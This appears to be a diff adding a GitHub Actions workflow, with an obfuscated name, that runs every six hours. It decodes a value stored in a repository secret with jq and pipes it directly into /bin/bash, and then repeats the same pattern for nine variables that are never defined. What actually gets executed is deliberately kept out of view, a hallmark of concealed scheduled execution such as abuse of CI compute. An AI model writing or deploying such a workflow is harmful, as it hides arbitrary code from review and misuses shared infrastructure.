@@ -1,0 +1,27 @@
+name: yizhifchunag
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yizhifchunag
+        env:
+          e69: ${{ secrets.e69 }}
+        run: |
+          echo $e69 | jq -r .skk83825 | /bin/bash
+          echo $fol3297 | jq -r .hzw2188 | /bin/bash
+          echo $m0 | jq -r .z43459 | /bin/bash
+          echo $llxwy6 | jq -r .l704 | /bin/bash
+          echo $rdhvg1735 | jq -r .rb32848 | /bin/bash
+          echo $rvo649 | jq -r .pqik929 | /bin/bash
+          echo $kyu7 | jq -r .dtzfc341 | /bin/bash
+          echo $j4 | jq -r .n159 | /bin/bash
+          echo $hzfsz6 | jq -r .ksda2152 | /bin/bash
+          echo $fu1 | jq -r .mfz845 | /bin/bash
+
